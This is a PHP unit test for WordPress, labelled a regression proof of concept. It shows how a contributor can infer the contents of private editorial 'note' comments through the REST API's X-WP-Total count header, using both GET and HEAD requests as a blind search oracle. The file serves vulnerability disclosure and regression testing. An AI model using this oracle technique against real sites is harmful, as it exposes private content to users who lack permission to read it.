<?php
/**
 * Regression PoC for private Block Notes search-count disclosure.
 *
 * @group restapi
 * @group wp-notes-oracle
 */
class WP_Test_REST_Comments_Note_Search_Oracle extends WP_Test_REST_TestCase {
	protected static $editor_id;
	protected static $contributor_id;
	protected static $post_id;

	public static function wpSetUpBeforeClass( WP_UnitTest_Factory $factory ) {
		self::$editor_id = $factory->user->create(
			array(
				'role' => 'editor',
			)
		);
		self::$contributor_id = $factory->user->create(
			array(
				'role' => 'contributor',
			)
		);
	}

	public static function wpTearDownAfterClass() {
		if ( self::$post_id ) {
			wp_delete_post( self::$post_id, true );
		}
		self::delete_user( self::$editor_id );
		self::delete_user( self::$contributor_id );
	}

	public function test_hidden_note_content_can_be_probed_through_total_header() {
		$marker = 'H1-PRIVATE-MARKER-9F3X';

		self::$post_id = self::factory()->post->create(
			array(
				'post_status' => 'publish',
				'post_author' => self::$editor_id,
			)
		);

		self::factory()->comment->create(
			array(
				'comment_post_ID'  => self::$post_id,
				'comment_type'     => 'note',
				'comment_approved' => 1,
				'user_id'          => self::$editor_id,
				'comment_content'  => 'Private editorial note: ' . $marker . ' ships Friday.',
			)
		);

		wp_set_current_user( self::$contributor_id );

		$matching = $this->query_notes( $marker, 'GET' );
		$this->assertSame( 200, $matching->get_status() );
		$this->assertSame( array(), $matching->get_data(), 'Contributor must not receive the hidden note body.' );
		$this->assertSame( '1', $matching->get_headers()['X-WP-Total'], 'A matching secret substring leaks through X-WP-Total.' );

		$non_matching = $this->query_notes( 'H1-NOT-PRESENT-0000', 'GET' );
		$this->assertSame( 200, $non_matching->get_status() );
		$this->assertSame( array(), $non_matching->get_data() );
		$this->assertSame( '0', $non_matching->get_headers()['X-WP-Total'], 'A non-matching substring returns a distinguishable count.' );

		$head = $this->query_notes( $marker, 'HEAD' );
		$this->assertSame( 200, $head->get_status() );
		$this->assertSame( '1', $head->get_headers()['X-WP-Total'], 'HEAD exposes the same blind search oracle.' );
	}

	private function query_notes( $search, $method ) {
		$request = new WP_REST_Request( $method, '/wp/v2/comments' );
		$request->set_param( 'post', self::$post_id );
		$request->set_param( 'type', 'note' );
		$request->set_param( 'context', 'view' );
		$request->set_param( 'search', $search );
		$request->set_param( 'per_page', 100 );

		return rest_get_server()->dispatch( $request );
	}
}
